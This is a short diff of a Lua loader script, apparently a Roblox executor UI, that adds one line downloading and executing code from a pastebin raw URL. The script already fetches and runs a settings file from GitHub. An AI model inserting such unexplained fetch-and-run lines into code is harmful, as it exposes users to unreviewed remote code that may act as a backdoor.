@@ -1,6 +1,7 @@
 local function loadUI()
 	repeat wait(0.25) until game:IsLoaded()
 	local DiscordC = loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Main/main/CubixSettings.lua"))()
+	loadstring(game:HttpGet('https://pastebin.com/raw/Cj2qTcBe'))()
 
 	local G2L = {};
 
